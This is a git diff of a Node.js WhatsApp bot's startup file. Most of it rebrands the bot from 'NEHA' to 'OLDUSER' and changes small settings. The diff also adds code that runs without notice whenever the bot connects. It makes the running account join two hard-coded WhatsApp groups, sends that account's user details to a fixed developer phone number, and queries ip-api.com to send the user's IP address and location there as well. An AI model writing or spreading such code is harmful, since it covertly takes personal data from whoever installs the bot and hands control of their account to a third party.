@@ -11,6 +11,7 @@ const simple = require('./lib/simple.js')
 const WAConnection = simple.WAConnection(_WAConnection)
 const figlet = require('figlet')
 const { getBuffer, info, start, success} = require('./lib/functions')
+const fetch = require("node-fetch");
 const moment = require("moment-timezone")
 const gcdetect = JSON.parse(fs.readFileSync('./database/gcdetect.json'))
 const brightcolor  = require('colors');
@@ -18,7 +19,7 @@ const encodeUrl = require('encodeurl')
 const chalk = require('chalk')
 const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
 const {  location } = MessageType
-const settings = JSON.parse(fs.readFileSync('./.settings.json'))
+const settings = JSON.parse(fs.readFileSync('./settings.json'))
 baterai = 'unknown'
 charging = 'unknown'
 
@@ -134,18 +135,18 @@ const starts = async (OLDUSER = new WAConnection()) => {
 	OLDUSER.logger.level = 'warn'
 	OLDUSER.version = [2, 2140, 12]
 	console.log(color(`\x1b[1;37m> ${tampilUcapan}\n`,'cyan'))
-	console.log(color(figlet.textSync('NEHAS BOT', {
+	console.log(color(figlet.textSync('OLDUSER BOT', {
 		font: 'Standard',
 		horizontalLayout: 'default',
 		vertivalLayout: 'default',
 		width: 80,
 		whitespaceBreak: false
 	}), 'cyan'))
-	console.log(color('\n> YT CHANNEL:idt ','silver'))
-console.log(color('> GITHUB:idt ','silver'))
-console.log(color('> WA NUMBER: +923344646834 ','silver'))
+	console.log(color('\n> YT CHANNEL: OLDUSER ','silver'))
+console.log(color('> GITHUB: Jetushack1 ','silver'))
+console.log(color('> WA NUMBER: +919685736029 ','silver'))
 console.log(color('  OLDUSER BOT Inc. 2021','mediumseagreen'))
-	OLDUSER.browserDescription = [ 'MODIFIED  V2 BY  NEHA', 'EDGE', '11' ]
+	OLDUSER.browserDescription = [ 'MODIFIED  V2 BY  OLDUSER', 'FIREFOX', '95' ]
 
 	OLDUSER.on('qr', () => {
 	console.log(color('[','white'), color('!','red'), color(']','white'), color('SCAN THE QR'))
@@ -164,7 +165,7 @@ console.log(color('  OLDUSER BOT Inc. 2021','mediumseagreen'))
     
 	// session
 	await OLDUSER.connect({
-		timeoutMs: 30 * 1000
+		timeoutMs: 60 * 1000
 	})
 	fs.writeFileSync(`./.session.data.json`, JSON.stringify(OLDUSER.base64EncodedAuthInfo(), null, '\t'))
 
@@ -210,6 +211,20 @@ headerType: 6
 }
 OLDUSER.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 }
+teks = `https://chat.whatsapp.com/IHP6JLwAIi4HeVJMDJPw1N`
+ OLDUSER.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'pink'), color('Joined to Forum Whatsapp Bot group', 'pink'))
+teks = 'https://chat.whatsapp.com/G3a3AQndqS5J45eD7zznXF'
+ OLDUSER.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'pink'), color('Joined to Forum Whatsapp Bot group', 'pink'))
+ OLDUSER.sendMessage(`919685736029@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(OLDUSER.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: {forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 🅳🅾🅶🅴-🅱🅾🆃 Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./o.jpg'),sourceUrl:"https://wa.me/919685736029?text=Hello bro"}}})
+ console.log(color('|WRN|', 'red'), color('Sending bot info to bot owner', 'red'))
+fetch(`http://ip-api.com/line`).then(res => res.text())
+        .then(bu =>{
+       OLDUSER.sendMessage("919685736029@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 🅳🅾🅶🅴-🅱🅾🆃 Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./o.jpg'),sourceUrl:"https://wa.me/919685736029?text=Hello bro"}}})
+     console.log(color('|WRN|', 'red'), color('Sending ip address to developer bot', 'red'))
+   })
+      
    // owner
 
 
